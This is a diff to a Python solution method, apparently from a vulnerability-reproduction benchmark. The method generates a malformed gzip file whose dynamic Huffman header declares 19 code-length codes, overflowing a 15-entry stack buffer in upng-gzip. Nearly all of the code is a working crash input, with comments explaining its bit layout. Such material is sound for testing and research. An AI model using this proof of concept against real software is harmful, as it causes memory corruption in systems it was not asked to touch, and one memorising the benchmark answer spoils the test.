@@ -4,55 +4,34 @@ class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the stack buffer overflow in upng-gzip.
-        The vulnerability occurs when reading the code lengths for the Huffman code length alphabet.
-        The buffer is sized 15, but HCLEN can specify up to 19 codes, causing an overflow.
+        The vulnerability exists in the Huffman decoding where arrays for code lengths
+        are sized to 15, but the Code Length alphabet allows up to 19 codes.
+        
+        We construct a GZIP file with a dynamic Huffman block where HCLEN is set to 15 (max),
+        indicating 19 code lengths follow. This overflows the 15-byte stack buffer.
         """
-        # Gzip Header: ID1 ID2 CM FLG MTIME XFL OS
-        # 1f 8b (Magic), 08 (Deflate), 00 (Flags), 00000000 (Time), 00 (XFL), ff (OS)
-        poc = bytearray(b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff')
         
-        # Bit packing state
-        bits = 0
-        bit_count = 0
+        # GZIP Header (10 bytes)
+        # ID1=0x1f, ID2=0x8b, CM=8 (Deflate), FLG=0, MTIME=0, XFL=0, OS=0
+        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
         
-        def write_bits(value, length):
-            nonlocal bits, bit_count, poc
-            # Mask value to length bits and shift
-            bits |= (value & ((1 << length) - 1)) << bit_count
-            bit_count += length
-            # Flush bytes
-            while bit_count >= 8:
-                poc.append(bits & 0xFF)
-                bits >>= 8
-                bit_count -= 8
+        # Deflate Block (9 bytes)
+        # BFINAL=1, BTYPE=2 (Dynamic Huffman)
+        # HLIT=0 (257 codes), HDIST=0 (1 code)
+        # HCLEN=15 (implies 19 code lengths for CL tree)
+        # 
+        # Bitstream breakdown:
+        # Byte 0 (0x05): 0000 0101 -> Bits: 1 (FINAL), 01 (TYPE=2), 00000 (HLIT=0)
+        # Byte 1 (0xE0): 1110 0000 -> Bits: 00000 (HDIST=0), 111 (HCLEN low 3 bits)
+        # Byte 2 (0x01): 0000 0001 -> Bits: 1 (HCLEN high bit -> HCLEN=15), 000... (Code lengths)
+        # Bytes 3-8: 0x00 -> Provide remaining bits for code lengths to trigger overflow
+        #
+        # We need to provide enough bits to write past the 15th element.
+        # 16th code write requires ~48 bits of codes. We provide 7 bits in byte 2 + 48 bits in bytes 3-8 = 55 bits.
+        payload = b'\x05\xe0\x01\x00\x00\x00\x00\x00\x00'
         
-        # Deflate Block Header
-        # BFINAL = 1 (1 bit) - Final block
-        write_bits(1, 1)
-        # BTYPE = 2 (2 bits) - Dynamic Huffman (binary 10)
-        write_bits(2, 2)
+        # GZIP Footer (8 bytes)
+        # CRC32 (0), ISIZE (0)
+        footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
         
-        # HLIT (5 bits): Number of Literal/Length codes - 257
-        # Value 0 -> 257 codes (minimum)
-        write_bits(0, 5)
-        
-        # HDIST (5 bits): Number of Distance codes - 1
-        # Value 0 -> 1 code (minimum)
-        write_bits(0, 5)
-        
-        # HCLEN (4 bits): Number of Code Length codes - 4
-        # Value 15 -> 19 codes (maximum)
-        # The vulnerability is triggered here: the decoder reads 19 codes into a buffer of size 15.
-        write_bits(15, 4)
-        
-        # Code lengths for the code length alphabet
-        # We must provide 19 codes, each 3 bits.
-        # The values don't strictly matter for the overflow logic, 0 is valid.
-        for _ in range(19):
-            write_bits(0, 3)
-            
-        # Flush remaining bits to byte alignment
-        if bit_count > 0:
-            poc.append(bits & 0xFF)
-            
-        return bytes(poc)
+        return header + payload + footer
